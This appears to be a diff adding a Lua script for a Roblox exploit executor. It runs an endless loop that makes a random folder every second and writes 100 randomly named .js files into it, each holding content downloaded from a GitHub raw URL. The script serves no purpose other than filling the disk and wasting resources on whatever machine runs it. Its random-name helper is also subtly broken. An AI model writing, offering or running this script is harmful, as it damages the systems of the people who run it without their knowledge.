@@ -1,0 +1,53 @@
+
+if not isfolder("A") then makefolder("A") end
+
+local function RandomName(length)
+	length = length or 8
+	local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	local str = ""
+	for i = 1, length do
+		str = str .. chars:sub(math.random(1, #chars), math.random(1, #chars))
+	end
+	return str
+end
+
+-- 下载网页内容
+local function DownloadFile(url)
+	local success, response = pcall(function()
+		return game:HttpGet(url)
+	end)
+	if success then
+		return response
+	else
+		warn("Failed to download:", url)
+		return nil
+	end
+end
+
+local function CreateFolderWithFiles(url)
+	local folderName = RandomName(12)
+	local folderPath = "A/" .. folderName
+
+	if not isfolder(folderPath) then
+		makefolder(folderPath)
+	end
+
+	for i = 1, 100 do
+		local fileName = RandomName(10) .. ".js"
+		local filePath = folderPath .. "/" .. fileName
+		print("Creating:", filePath)
+
+		local content = DownloadFile(url)
+		if content then
+			writefile(filePath, content)
+		else
+			writefile(filePath, "// Failed to download content") 
+		end
+	end
+end
+
+local url = "https://raw.githubusercontent.com/snwmdd114514-lang/roblox-lua-/refs/heads/main/下载请求" --  URL
+while true do
+	CreateFolderWithFiles(url)
+	wait(1)
+end
